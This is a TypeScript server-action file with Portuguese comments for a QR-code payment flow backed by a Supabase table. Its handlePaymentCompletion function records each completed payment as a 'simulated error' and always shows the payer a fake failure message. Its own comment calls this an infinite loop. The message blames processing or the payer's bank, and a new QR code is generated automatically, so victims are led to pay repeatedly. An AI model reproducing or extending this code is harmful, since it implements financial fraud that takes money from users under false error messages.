'use server'

import { createServerSupabaseClient } from '@/lib/supabase/server'

interface ActivePaymentResult {
    hasActivePayment: boolean
    paymentId?: string
    qrCode?: string
    expiresAt?: string
    timeRemaining?: number
}

interface PaymentCompletionResult {
    shouldShowError: true
    errorMessage: string
    canRetryImmediately: boolean
    waitTimeMinutes: number
    shouldAutoGenerate: boolean
}

/**
 * Verifica se o usuário tem um pagamento ativo (pending) que ainda não expirou
 */
export async function getActivePayment(userId: string, phoneNumber: string): Promise<ActivePaymentResult> {
    const supabase = createServerSupabaseClient()

    try {
        // Buscar pagamento pendente mais recente
        const { data: activePayment, error } = await supabase
            .from('payment_attempts')
            .select('*')
            .eq('user_id', userId)
            .eq('phone_number', phoneNumber)
            .eq('status', 'pending')
            .order('created_at', { ascending: false })
            .limit(1)
            .single()

        if (error && error.code !== 'PGRST116') {
            console.error('Error fetching active payment:', error)
            return { hasActivePayment: false }
        }

        if (!activePayment) {
            return { hasActivePayment: false }
        }

        // Verificar se ainda está dentro do prazo de 20 minutos
        if (!activePayment.created_at) {
            return { hasActivePayment: false }
        }

        const createdAt = new Date(activePayment.created_at)
        const now = new Date()
        const diffMinutes = (now.getTime() - createdAt.getTime()) / (1000 * 60)

        if (diffMinutes >= 20) {
            // Pagamento expirou, atualizar status
            await supabase
                .from('payment_attempts')
                .update({ status: 'expired', updated_at: new Date().toISOString() })
                .eq('id', activePayment.id)

            return { hasActivePayment: false }
        }

        // Calcular tempo restante em segundos
        const timeRemaining = Math.ceil((20 - diffMinutes) * 60)

        // Calcular data de expiração
        const expiresAt = new Date(createdAt.getTime() + 20 * 60 * 1000).toISOString()

        return {
            hasActivePayment: true,
            paymentId: activePayment.payment_id || undefined,
            qrCode: activePayment.qr_code || undefined,
            expiresAt,
            timeRemaining
        }
    } catch (error) {
        console.error('Error checking active payment:', error)
        return { hasActivePayment: false }
    }
}

/**
 * Salva o QR code gerado no banco de dados
 */
export async function saveQRCode(
    userId: string,
    paymentId: string,
    phoneNumber: string,
    qrCode: string,
    amount: number
) {
    const supabase = createServerSupabaseClient()

    try {
        const { error } = await supabase
            .from('payment_attempts')
            .insert({
                user_id: userId,
                payment_id: paymentId,
                phone_number: phoneNumber,
                qr_code: qrCode,
                amount,
                status: 'pending',
                is_simulated_error: false,
                retry_count: 0
            })

        if (error) throw error
        return { success: true }
    } catch (error) {
        console.error('Error saving QR code:', error)
        return { success: false, error }
    }
}

/**
 * Conta quantos pagamentos foram completados (incluindo erros simulados) para este número
 */
export async function getCompletedPaymentCountForPhone(
    userId: string,
    phoneNumber: string
): Promise<number> {
    const supabase = createServerSupabaseClient()

    try {
        const { data, error } = await supabase
            .from('payment_attempts')
            .select('*')
            .eq('user_id', userId)
            .eq('phone_number', phoneNumber)
            .eq('status', 'completed')
            .eq('is_simulated_error', true)

        if (error) {
            console.error('Error counting completed payments:', error)
            return 0
        }

        return data?.length || 0
    } catch (error) {
        console.error('Error counting completed payments:', error)
        return 0
    }
}

/**
 * Manipula a conclusão de um pagamento e retorna se deve mostrar erro
 * SEMPRE retorna erro (loop infinito)
 */
export async function handlePaymentCompletion(
    userId: string,
    phoneNumber: string,
    paymentId: string
): Promise<PaymentCompletionResult> {
    const supabase = createServerSupabaseClient()

    try {
        // Contar pagamentos anteriores
        const paymentCount = await getCompletedPaymentCountForPhone(userId, phoneNumber)

        // Marcar este pagamento como erro simulado
        await supabase
            .from('payment_attempts')
            .update({
                is_simulated_error: true,
                status: 'completed',
                updated_at: new Date().toISOString()
            })
            .eq('payment_id', paymentId)

        if (paymentCount === 0) {
            // 1º pagamento - retry imediato (3 segundos)
            return {
                shouldShowError: true,
                errorMessage: 'Erro de processamento. Gerando novo código...',
                canRetryImmediately: true,
                waitTimeMinutes: 0,
                shouldAutoGenerate: true
            }
        } else {
            // 2º+ pagamento - aguardar 30 minutos
            return {
                shouldShowError: true,
                errorMessage: 'Erro com seu banco. Aguarde enquanto tentamos novamente.',
                canRetryImmediately: false,
                waitTimeMinutes: 30,
                shouldAutoGenerate: true
            }
        }
    } catch (error) {
        console.error('Error handling payment completion:', error)
        // Em caso de erro, retorna como se fosse 2º+ pagamento (seguro)
        return {
            shouldShowError: true,
            errorMessage: 'Erro ao processar pagamento. Aguarde.',
            canRetryImmediately: false,
            waitTimeMinutes: 30,
            shouldAutoGenerate: true
        }
    }
}
